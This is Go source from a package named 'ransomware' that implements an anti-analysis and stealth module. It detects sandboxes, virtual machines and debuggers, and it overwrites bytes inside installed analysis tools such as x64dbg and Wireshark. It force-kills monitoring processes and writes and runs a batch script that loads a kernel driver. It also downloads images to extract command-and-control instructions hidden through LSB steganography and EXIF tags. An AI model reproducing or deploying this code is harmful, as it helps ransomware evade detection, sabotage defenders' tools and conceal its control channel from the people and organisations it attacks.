package ransomware

import (
	"bytes"
	"crypto/rand"
	"encoding/binary"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

type AntiAnalysisEngine struct {
	config  *RansomwareConfig
	stealth *C2StegoConfig
}

var offensiveTools = []string{
	"procmon.exe", "procexp.exe", "processhacker.exe", "wireshark.exe",
	"x64dbg.exe", "ollydbg.exe", "ida.exe", "ida64.exe",
	"ghidra.exe", "dnspy.exe", "cheatengine.exe",
	"fiddler.exe", "charles.exe", "burpsuite.exe",
	"tcpview.exe", "autoruns.exe", "handle.exe",
	"psexec.exe", "dbgview.exe", "regmon.exe",
}

var analysisIndicators = []string{
	"VBoxGuest", "VMwareTray", "VMwareUser", "vmusrvc",
	"vmtoolsd", "xenservice", "qemu-ga",
	"procmon", "wireshark", "processhacker",
	"dumpcap", "tcpdump", "tshark",
}

func NewAntiAnalysisEngine(cfg *RansomwareConfig) *AntiAnalysisEngine {
	return &AntiAnalysisEngine{
		config: cfg,
		stealth: &C2StegoConfig{
			TwitterHandle:       "@x404x_stego",
			ImageEndpoint:       "https://cdn.social.com/images/",
			PollIntervalSeconds: 300,
			LSBBits:             1,
			EXIFKey:             "X404X-Session",
		},
	}
}

func (aa *AntiAnalysisEngine) IsSandboxed() bool {
	hostname, _ := os.Hostname()
	hostname = strings.ToLower(hostname)

	sandboxHosts := []string{
		"sandbox", "malware", "analysis", "virustotal",
		"cuckoo", "cape", "joe", "hybrid",
		"sample", "test", "win10", "win7",
	}

	for _, s := range sandboxHosts {
		if strings.Contains(hostname, s) {
			return true
		}
	}

	return false
}

func (aa *AntiAnalysisEngine) HasKernelDebugger() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	checks := []string{
		`(Get-WmiObject Win32_ComputerSystem).Model -match "Virtual"`,
		`(Get-ItemProperty "HKLM:\HARDWARE\DESCRIPTION\System\BIOS").SystemManufacturer -match "VMware|VirtualBox|QEMU"`,
	}

	script := strings.Join(checks, " -or ")
	cmd := exec.Command("powershell", "-Command",
		fmt.Sprintf("if (%s) { exit 0 } else { exit 1 }", script))
	return cmd.Run() == nil
}

func (aa *AntiAnalysisEngine) EnterSleepMode(duration time.Duration) {
	time.Sleep(duration)
}

func (aa *AntiAnalysisEngine) SabotageAnalysisTools() error {
	if aa.config.Simulation {
		return nil
	}

	for _, tool := range offensiveTools {
		paths := []string{
			"C:\\Program Files\\" + tool,
			"C:\\Program Files (x86)\\" + tool,
			os.Getenv("LOCALAPPDATA") + "\\Programs\\" + tool,
			os.Getenv("ProgramFiles") + "\\" + tool,
		}

		for _, p := range paths {
			if _, err := os.Stat(p); err == nil {
				data, err := os.ReadFile(p)
				if err != nil {
					continue
				}

				if len(data) < 512 {
					continue
				}
				copy(data[128:160], aa.randomBytes(32))
				os.WriteFile(p, data, 0644)
			}
		}
	}

	return nil
}

func (aa *AntiAnalysisEngine) KillAnalysisProcesses() error {
	if runtime.GOOS != "windows" {
		return nil
	}

	for _, proc := range analysisIndicators {
		exec.Command("taskkill", "/F", "/IM", proc+".exe").Start()
		exec.Command("taskkill", "/F", "/IM", proc+".exe").Start()
	}

	driverScript := `
sc create x404xkill binPath= "C:\Windows\System32\drivers\kprocesshacker.sys" type= kernel
sc start x404xkill
`
	scriptPath := os.TempDir() + "\\x404x_drv.bat"
	os.WriteFile(scriptPath, []byte(driverScript), 0644)
	exec.Command("cmd", "/c", scriptPath).Start()

	return nil
}

func (aa *AntiAnalysisEngine) StegoDecodeC2Image(imageURL string) ([]byte, error) {
	resp, err := http.Get(imageURL)
	if err != nil {
		return nil, fmt.Errorf("failed to download image: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("image download returned status %d", resp.StatusCode)
	}

	imageData, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read image body: %w", err)
	}

	pixelData, err := aa.extractPixelData(imageData)
	if err != nil {
		return nil, fmt.Errorf("failed to extract pixel data: %w", err)
	}

	if len(pixelData) < 32 {
		return nil, fmt.Errorf("image too small to contain LSB payload")
	}

	lengthBits := pixelData[:32]
	var payloadLen uint32
	for i := 0; i < 32; i++ {
		payloadLen = (payloadLen << 1) | uint32(lengthBits[i]&1)
	}

	if payloadLen == 0 || int(payloadLen)*8+32 > len(pixelData) {
		return nil, fmt.Errorf("invalid payload length %d encoded in image", payloadLen)
	}

	payload := make([]byte, payloadLen)
	offset := 32
	for i := uint32(0); i < payloadLen; i++ {
		var b byte
		for bit := 7; bit >= 0; bit-- {
			b = (b << 1) | (pixelData[offset] & 1)
			offset++
		}
		payload[i] = b
	}

	return payload, nil
}

func (aa *AntiAnalysisEngine) StegoEncodeC2Response(data []byte, imagePath string) ([]byte, error) {
	imageData, err := os.ReadFile(imagePath)
	if err != nil {
		return nil, fmt.Errorf("failed to read image: %w", err)
	}

	pixelStart, pixelEnd, err := aa.findPixelRegion(imageData)
	if err != nil {
		return nil, fmt.Errorf("failed to locate pixel data: %w", err)
	}

	pixelRegion := imageData[pixelStart:pixelEnd]
	totalBitsNeeded := 32 + len(data)*8

	if totalBitsNeeded > len(pixelRegion) {
		return nil, fmt.Errorf("payload too large: need %d bits, image has %d pixel bytes", totalBitsNeeded, len(pixelRegion))
	}

	result := make([]byte, len(imageData))
	copy(result, imageData)
	pixels := result[pixelStart:pixelEnd]

	payloadLen := uint32(len(data))
	bitIdx := 0
	for i := 31; i >= 0; i-- {
		lenBit := byte((payloadLen >> i) & 1)
		pixels[bitIdx] = (pixels[bitIdx] & 0xFE) | lenBit
		bitIdx++
	}

	for _, b := range data {
		for bit := 7; bit >= 0; bit-- {
			dataBit := (b >> bit) & 1
			pixels[bitIdx] = (pixels[bitIdx] & 0xFE) | dataBit
			bitIdx++
		}
	}

	return result, nil
}

func (aa *AntiAnalysisEngine) ExtractCommandFromEXIF(imageData []byte) ([]byte, error) {
	if len(imageData) < 4 {
		return nil, fmt.Errorf("data too short to be a valid image")
	}

	if imageData[0] == 0xFF && imageData[1] == 0xD8 {
		return aa.extractEXIFFromJPEG(imageData)
	}

	if len(imageData) >= 8 {
		tiffLE := imageData[0] == 'I' && imageData[1] == 'I' && imageData[2] == 0x2A && imageData[3] == 0x00
		tiffBE := imageData[0] == 'M' && imageData[1] == 'M' && imageData[2] == 0x00 && imageData[3] == 0x2A
		if tiffLE || tiffBE {
			return aa.extractTagFromTIFF(imageData, 0)
		}
	}

	return nil, fmt.Errorf("unsupported image format")
}

func (aa *AntiAnalysisEngine) extractEXIFFromJPEG(data []byte) ([]byte, error) {
	offset := 2

	for offset < len(data)-1 {
		if data[offset] != 0xFF {
			offset++
			continue
		}

		marker := data[offset+1]
		offset += 2

		if marker == 0xD9 {
			break
		}

		if marker == 0xDA {
			break
		}

		if offset+2 > len(data) {
			break
		}

		segLen := int(binary.BigEndian.Uint16(data[offset : offset+2]))
		if segLen < 2 {
			break
		}

		if marker == 0xE1 {
			segData := data[offset+2 : offset+segLen]
			if len(segData) >= 6 && string(segData[:6]) == "Exif\x00\x00" {
				tiffData := segData[6:]
				cmd, err := aa.extractTagFromTIFF(tiffData, 0)
				if err == nil {
					return cmd, nil
				}
			}
		}

		offset += segLen
	}

	return nil, fmt.Errorf("EXIF tag 0x0404 not found in JPEG")
}

func (aa *AntiAnalysisEngine) extractTagFromTIFF(tiffData []byte, baseOffset int) ([]byte, error) {
	if len(tiffData) < 8 {
		return nil, fmt.Errorf("TIFF data too short")
	}

	var byteOrder binary.ByteOrder
	if tiffData[0] == 'I' && tiffData[1] == 'I' {
		byteOrder = binary.LittleEndian
	} else if tiffData[0] == 'M' && tiffData[1] == 'M' {
		byteOrder = binary.BigEndian
	} else {
		return nil, fmt.Errorf("invalid TIFF byte order")
	}

	ifdOffset := int(byteOrder.Uint32(tiffData[4:8]))
	if ifdOffset >= len(tiffData) || ifdOffset < 0 {
		return nil, fmt.Errorf("invalid IFD offset")
	}

	for ifdOffset > 0 && ifdOffset < len(tiffData)-2 {
		numEntries := int(byteOrder.Uint16(tiffData[ifdOffset : ifdOffset+2]))
		entryStart := ifdOffset + 2

		for i := 0; i < numEntries; i++ {
			entryOffset := entryStart + i*12
			if entryOffset+12 > len(tiffData) {
				break
			}

			tagID := byteOrder.Uint16(tiffData[entryOffset : entryOffset+2])

			if tagID == 0x0404 {
				dataType := byteOrder.Uint16(tiffData[entryOffset+2 : entryOffset+4])
				count := byteOrder.Uint32(tiffData[entryOffset+4 : entryOffset+8])

				var dataSize uint32
				switch dataType {
				case 1, 7:
					dataSize = count
				case 2:
					dataSize = count
				case 3:
					dataSize = count * 2
				case 4:
					dataSize = count * 4
				default:
					dataSize = count
				}

				var valueData []byte
				if dataSize <= 4 {
					valueData = tiffData[entryOffset+8 : entryOffset+8+int(dataSize)]
				} else {
					valueOffset := int(byteOrder.Uint32(tiffData[entryOffset+8 : entryOffset+12]))
					if valueOffset+int(dataSize) > len(tiffData) {
						return nil, fmt.Errorf("EXIF tag 0x0404 data out of bounds")
					}
					valueData = tiffData[valueOffset : valueOffset+int(dataSize)]
				}

				if dataType == 2 && len(valueData) > 0 && valueData[len(valueData)-1] == 0 {
					valueData = valueData[:len(valueData)-1]
				}

				return valueData, nil
			}
		}

		nextIFDOffset := entryStart + numEntries*12
		if nextIFDOffset+4 > len(tiffData) {
			break
		}
		ifdOffset = int(byteOrder.Uint32(tiffData[nextIFDOffset : nextIFDOffset+4]))
		if ifdOffset == 0 {
			break
		}
	}

	return nil, fmt.Errorf("EXIF tag 0x0404 not found")
}

func (aa *AntiAnalysisEngine) extractPixelData(imageData []byte) ([]byte, error) {
	if len(imageData) < 8 {
		return nil, fmt.Errorf("image data too short")
	}

	pngSig := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}
	if bytes.HasPrefix(imageData, pngSig) {
		return aa.extractPNGPixels(imageData)
	}

	if imageData[0] == 0xFF && imageData[1] == 0xD8 {
		return aa.extractJPEGPixels(imageData)
	}

	if len(imageData) > 54 && imageData[0] == 'B' && imageData[1] == 'M' {
		offset := int(binary.LittleEndian.Uint32(imageData[10:14]))
		if offset < len(imageData) {
			return imageData[offset:], nil
		}
	}

	return imageData, nil
}

func (aa *AntiAnalysisEngine) extractPNGPixels(data []byte) ([]byte, error) {
	var pixels []byte
	offset := 8

	for offset < len(data)-8 {
		if offset+8 > len(data) {
			break
		}
		chunkLen := int(binary.BigEndian.Uint32(data[offset : offset+4]))
		chunkType := string(data[offset+4 : offset+8])

		if chunkType == "IDAT" {
			if offset+8+chunkLen <= len(data) {
				pixels = append(pixels, data[offset+8:offset+8+chunkLen]...)
			}
		}

		if chunkType == "IEND" {
			break
		}

		offset += 12 + chunkLen
	}

	if len(pixels) == 0 {
		return nil, fmt.Errorf("no IDAT chunks found in PNG")
	}

	return pixels, nil
}

func (aa *AntiAnalysisEngine) extractJPEGPixels(data []byte) ([]byte, error) {
	sosIdx := -1
	for i := 0; i < len(data)-1; i++ {
		if data[i] == 0xFF && data[i+1] == 0xDA {
			sosIdx = i
			break
		}
	}

	if sosIdx == -1 {
		return data, nil
	}

	if sosIdx+4 > len(data) {
		return data[sosIdx:], nil
	}

	headerLen := int(binary.BigEndian.Uint16(data[sosIdx+2 : sosIdx+4]))
	pixelStart := sosIdx + 2 + headerLen
	if pixelStart >= len(data) {
		return nil, fmt.Errorf("no scan data after SOS marker")
	}

	return data[pixelStart:], nil
}

func (aa *AntiAnalysisEngine) findPixelRegion(imageData []byte) (int, int, error) {
	if len(imageData) < 8 {
		return 0, 0, fmt.Errorf("image data too short")
	}

	pngSig := []byte{0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A}
	if bytes.HasPrefix(imageData, pngSig) {
		offset := 8
		for offset < len(imageData)-8 {
			chunkLen := int(binary.BigEndian.Uint32(imageData[offset : offset+4]))
			chunkType := string(imageData[offset+4 : offset+8])
			if chunkType == "IDAT" {
				return offset + 8, offset + 8 + chunkLen, nil
			}
			offset += 12 + chunkLen
		}
		return 0, 0, fmt.Errorf("no IDAT chunk found")
	}

	if imageData[0] == 0xFF && imageData[1] == 0xD8 {
		for i := 0; i < len(imageData)-1; i++ {
			if imageData[i] == 0xFF && imageData[i+1] == 0xDA {
				if i+4 > len(imageData) {
					break
				}
				headerLen := int(binary.BigEndian.Uint16(imageData[i+2 : i+4]))
				start := i + 2 + headerLen
				end := len(imageData)
				for j := end - 2; j > start; j-- {
					if imageData[j] == 0xFF && imageData[j+1] == 0xD9 {
						end = j
						break
					}
				}
				return start, end, nil
			}
		}
		return 0, 0, fmt.Errorf("no SOS marker found in JPEG")
	}

	if len(imageData) > 54 && imageData[0] == 'B' && imageData[1] == 'M' {
		pixelOffset := int(binary.LittleEndian.Uint32(imageData[10:14]))
		return pixelOffset, len(imageData), nil
	}

	return 0, len(imageData), nil
}

func (aa *AntiAnalysisEngine) EmbedInLSB(imageData []byte, payload []byte) ([]byte, error) {
	if len(payload)*8 > len(imageData) {
		return nil, fmt.Errorf("payload too large for image")
	}

	result := make([]byte, len(imageData))
	copy(result, imageData)

	bitIndex := 0
	for i := 0; i < len(payload); i++ {
		for bit := 7; bit >= 0; bit-- {
			payloadBit := (payload[i] >> bit) & 1
			result[bitIndex] = (imageData[bitIndex] & 0xFE) | byte(payloadBit)
			bitIndex++
		}
	}

	return result, nil
}

func (aa *AntiAnalysisEngine) ExtractFromLSB(imageData []byte, payloadLen int) ([]byte, error) {
	payload := make([]byte, payloadLen)
	bitIndex := 0

	for i := 0; i < payloadLen; i++ {
		for bit := 7; bit >= 0; bit-- {
			payloadBit := imageData[bitIndex] & 1
			payload[i] = (payload[i] << 1) | payloadBit
			bitIndex++
		}
	}

	return payload, nil
}

func (aa *AntiAnalysisEngine) CheckDebugger() bool {
	if runtime.GOOS != "windows" {
		return false
	}

	checks := []string{
		`[System.Diagnostics.Debugger]::IsAttached`,
		`[System.Diagnostics.Debugger]::Log(0, "", "")`,
	}

	for _, c := range checks {
		cmd := exec.Command("powershell", "-Command",
			fmt.Sprintf("if (%s) { exit 0 } else { exit 1 }", c))
		if cmd.Run() == nil {
			return true
		}
	}

	return false
}

func (aa *AntiAnalysisEngine) randomBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func (aa *AntiAnalysisEngine) StealthConfig() *C2StegoConfig {
	return aa.stealth
}
